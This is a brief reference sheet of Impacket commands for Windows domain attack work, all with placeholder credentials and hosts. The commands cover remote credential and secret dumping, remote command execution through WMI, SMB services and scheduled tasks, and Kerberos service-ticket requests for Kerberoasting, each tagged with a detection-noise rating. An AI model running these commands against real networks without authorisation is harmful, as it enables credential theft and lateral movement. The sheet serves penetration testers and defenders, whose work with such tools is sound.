# Impacket

<div class="ol-version-note">Syntax can drift between releases. Confirm with the tool's local <code>--version</code> and <code>--help</code> output.</div>

Frequently used Impacket one-liners.

### SMB shares

```bash
smbclient.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** SMB, Shares · **Context:** Domain user · **Noise:** Moderate

### Remote registry secrets

```bash
secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Credentials, Remote Registry · **Context:** Domain user · **Noise:** Moderate

### WMI shell

```bash
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** WMI, Execution · **Context:** Domain user · **Noise:** Moderate

### SMB service execution

```bash
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** SMB, Execution · **Context:** Domain user · **Noise:** Moderate

### Scheduled task execution

```bash
atexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST> "whoami"
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Task Scheduler, Execution · **Context:** Domain user · **Noise:** Moderate

### Request service ticket

```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, SPN · **Context:** Domain user · **Noise:** Moderate

### Request TGT

```bash
getTGT.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, TGT · **Context:** Domain user · **Noise:** Moderate

---

**Related:** [Overview](./) · [Httpx Katana](httpx-katana.md) · [John](john.md)
